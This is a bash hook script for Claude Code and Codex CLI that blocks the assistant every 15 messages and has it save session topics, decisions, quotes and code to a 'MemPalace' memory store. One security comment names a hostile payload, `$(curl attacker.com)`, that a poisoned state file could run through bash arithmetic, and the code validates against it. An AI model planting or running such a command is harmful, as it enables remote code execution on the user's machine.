#!/bin/bash
# MEMPALACE SAVE HOOK — Auto-save every N exchanges
#
# Claude Code "Stop" hook. After every assistant response:
# 1. Counts human messages in the session transcript
# 2. Every SAVE_INTERVAL messages, BLOCKS the AI from stopping
# 3. Returns a reason telling the AI to save structured diary + palace entries
# 4. AI does the save (topics, decisions, code, quotes → organized into palace)
# 5. Next Stop fires with stop_hook_active=true → lets AI stop normally
#
# The AI does the classification — it knows what wing/hall/closet to use
# because it has context about the conversation. No regex needed.
#
# === INSTALL ===
# Add to .claude/settings.local.json:
#
#   "hooks": {
#     "Stop": [{
#       "matcher": "*",
#       "hooks": [{
#         "type": "command",
#         "command": "/absolute/path/to/mempal_save_hook.sh",
#         "timeout": 30
#       }]
#     }]
#   }
#
# For Codex CLI, add to .codex/hooks.json:
#
#   "Stop": [{
#     "type": "command",
#     "command": "/absolute/path/to/mempal_save_hook.sh",
#     "timeout": 30
#   }]
#
# === HOW IT WORKS ===
#
# Claude Code sends JSON on stdin with these fields:
#   session_id       — unique session identifier
#   stop_hook_active — true if AI is already in a save cycle (prevents infinite loop)
#   transcript_path  — path to the JSONL transcript file
#
# When we block, Claude Code shows our "reason" to the AI as a system message.
# The AI then saves to memory, and when it tries to stop again,
# stop_hook_active=true so we let it through. No infinite loop.
#
# === MEMPALACE CLI ===
# The hook ALWAYS mines the active conversation transcript automatically
# (via `python3 -m mempalace mine <transcript-dir> --mode convos`).
# MEMPAL_DIR is an *additional*, optional target for project files —
# it does not replace the conversation mine.
#
# === CONFIGURATION ===

SAVE_INTERVAL=15  # Save every N human messages (adjust to taste)
STATE_DIR="$HOME/.mempalace/hook_state"
mkdir -p "$STATE_DIR"

# Optional: project directory (code / notes / docs) to also mine on each
# save trigger. Mined with `--mode projects`. The conversation transcript
# is always mined regardless — this is purely additive.
# Example: MEMPAL_DIR="$HOME/projects/my_app"
MEMPAL_DIR=""

# Read JSON input from stdin
INPUT=$(cat)

# Parse fields from Claude Code's JSON
SESSION_ID=$(echo "$INPUT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('session_id','unknown'))" 2>/dev/null)
# Sanitize SESSION_ID to prevent path traversal (only allow alnum, dash, underscore)
SESSION_ID=$(echo "$SESSION_ID" | tr -cd 'a-zA-Z0-9_-')
[ -z "$SESSION_ID" ] && SESSION_ID="unknown"
STOP_HOOK_ACTIVE=$(echo "$INPUT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('stop_hook_active', False))" 2>/dev/null)
TRANSCRIPT_PATH=$(echo "$INPUT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('transcript_path',''))" 2>/dev/null)

# Expand ~ in path
TRANSCRIPT_PATH="${TRANSCRIPT_PATH/#\~/$HOME}"

# Validate that TRANSCRIPT_PATH looks like a transcript file:
#   - non-empty
#   - .jsonl or .json suffix
#   - no traversal segments (.. components)
# Defense-in-depth alongside the existing `[ -f ... ]` test below;
# rejects obvious junk before we hand the path to `dirname` and the
# miner.  Adapted from upstream MemPalace fe56797 (PR #1231 review).
is_valid_transcript_path() {
    local path="$1"
    [ -n "$path" ] || return 1
    case "$path" in
        *.json|*.jsonl) ;;
        *) return 1 ;;
    esac
    case "/$path/" in
        */../*) return 1 ;;
    esac
    return 0
}

# If we're already in a save cycle, let the AI stop normally
# This is the infinite-loop prevention: block once → AI saves → tries to stop again → we let it through
if [ "$STOP_HOOK_ACTIVE" = "True" ] || [ "$STOP_HOOK_ACTIVE" = "true" ]; then
    echo "{}"
    exit 0
fi

# Count human messages in the JSONL transcript
if [ -f "$TRANSCRIPT_PATH" ]; then
    EXCHANGE_COUNT=$(python3 - "$TRANSCRIPT_PATH" <<'PYEOF'
import json, sys
count = 0
with open(sys.argv[1]) as f:
    for line in f:
        try:
            entry = json.loads(line)
            msg = entry.get('message', {})
            if isinstance(msg, dict) and msg.get('role') == 'user':
                content = msg.get('content', '')
                # Skip system/command messages — only count real human input
                if isinstance(content, str) and '<command-message>' in content:
                    continue
                count += 1
        except:
            pass
print(count)
PYEOF
2>/dev/null)
else
    EXCHANGE_COUNT=0
fi

# Track last save point for this session
LAST_SAVE_FILE="$STATE_DIR/${SESSION_ID}_last_save"
LAST_SAVE=0
if [ -f "$LAST_SAVE_FILE" ]; then
    LAST_SAVE_RAW=$(cat "$LAST_SAVE_FILE")
    # SECURITY: bash arithmetic ($((...))) executes $(...) command substitution,
    # so a poisoned state file containing e.g. `$(curl attacker.com)` would
    # run that command on the next hook invocation. Validate as a plain integer
    # before letting the value reach $((EXCHANGE_COUNT - LAST_SAVE)) below.
    # Ported from upstream 0f217f7 (refs MemPalace/mempalace#809).
    if [[ "$LAST_SAVE_RAW" =~ ^[0-9]+$ ]]; then
        LAST_SAVE="$LAST_SAVE_RAW"
    fi
fi

SINCE_LAST=$((EXCHANGE_COUNT - LAST_SAVE))

# Derive a per-project wing name from the transcript path so the AI files
# diary entries under the project they're working in instead of a single
# wing_<agent> bucket. Claude Code stores transcripts under
# ~/.claude/projects/-encoded-project-folder/<session>.jsonl — the final
# dash-separated token is a stable handle for the project.  Adapted from
# upstream d158375 (PR #1145, the Linux/Cross-platform variant).
PROJECT_WING="wing_sessions"
if [ -n "$TRANSCRIPT_PATH" ]; then
    PROJECT_DIR=$(echo "$TRANSCRIPT_PATH" | sed -n 's|.*/.claude/projects/\([^/]*\)/.*|\1|p')
    if [ -n "$PROJECT_DIR" ]; then
        PROJECT_TOKEN=$(echo "$PROJECT_DIR" | awk -F- '{print $NF}' | tr -cd 'a-zA-Z0-9_-')
        if [ -n "$PROJECT_TOKEN" ]; then
            PROJECT_WING="wing_${PROJECT_TOKEN}"
        fi
    fi
fi

# Log for debugging (check ~/.mempalace/hook_state/hook.log)
echo "[$(date '+%H:%M:%S')] Session $SESSION_ID: $EXCHANGE_COUNT exchanges, $SINCE_LAST since last save, wing=$PROJECT_WING" >> "$STATE_DIR/hook.log"

# Time to save?
if [ "$SINCE_LAST" -ge "$SAVE_INTERVAL" ] && [ "$EXCHANGE_COUNT" -gt 0 ]; then
    # Update last save point
    echo "$EXCHANGE_COUNT" > "$LAST_SAVE_FILE"

    echo "[$(date '+%H:%M:%S')] TRIGGERING SAVE at exchange $EXCHANGE_COUNT" >> "$STATE_DIR/hook.log"

    # Auto-mine. Two independent targets — both run if both are set:
    #   1. TRANSCRIPT_PATH (from Claude Code) → parent dir, --mode convos
    #      (Claude Code session JSONL — must use the convo miner)
    #   2. MEMPAL_DIR (user-configured project) → --mode projects
    #      (code, notes, docs)
    # MEMPAL_DIR is *additive*, not an override: a user with MEMPAL_DIR
    # pointed at their project still gets the active conversation mined.
    # Adapted from upstream MemPalace eb4de04 (PR #1231 by @igorls) —
    # the previous behaviour silently skipped the transcript whenever
    # MEMPAL_DIR was set, which was the most common configuration in the
    # wild.
    if is_valid_transcript_path "$TRANSCRIPT_PATH" && [ -f "$TRANSCRIPT_PATH" ]; then
        python3 -m mempalace mine "$(dirname "$TRANSCRIPT_PATH")" --mode convos \
            >> "$STATE_DIR/hook.log" 2>&1 &
    elif [ -n "$TRANSCRIPT_PATH" ]; then
        echo "[$(date '+%H:%M:%S')] Skipping invalid transcript path: $TRANSCRIPT_PATH" \
            >> "$STATE_DIR/hook.log"
    fi
    if [ -n "$MEMPAL_DIR" ] && [ -d "$MEMPAL_DIR" ]; then
        python3 -m mempalace mine "$MEMPAL_DIR" --mode projects \
            >> "$STATE_DIR/hook.log" 2>&1 &
    fi

    # Block the AI and tell it to save. The "reason" becomes a system
    # message the AI sees and acts on; the wing= hint tells it which
    # project wing to file the entry in via mempalace_diary_write so
    # per-project diary search works.
    REASON_TEXT="AUTO-SAVE checkpoint. Save key topics, decisions, quotes, and code from this session to your memory system. Organize into appropriate categories. Use verbatim quotes where possible. When calling mempalace_diary_write, set wing=\"${PROJECT_WING}\". Continue conversation after saving."
    REASON_TEXT="$REASON_TEXT" python3 -c 'import json, os; print(json.dumps({"decision": "block", "reason": os.environ["REASON_TEXT"]}))'
else
    # Not time yet — let the AI stop normally
    echo "{}"
fi
